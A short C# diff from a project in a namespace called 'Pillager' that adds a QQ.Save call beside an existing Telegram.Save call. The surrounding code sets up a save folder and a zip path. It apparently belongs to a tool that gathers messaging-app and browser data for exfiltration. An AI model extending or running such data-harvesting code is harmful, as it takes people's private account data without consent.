@@ -17,6 +17,8 @@ namespace Pillager
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
 
+            QQ.Save(savepath);
+
             Telegram.Save(savepath);
 
             //IE
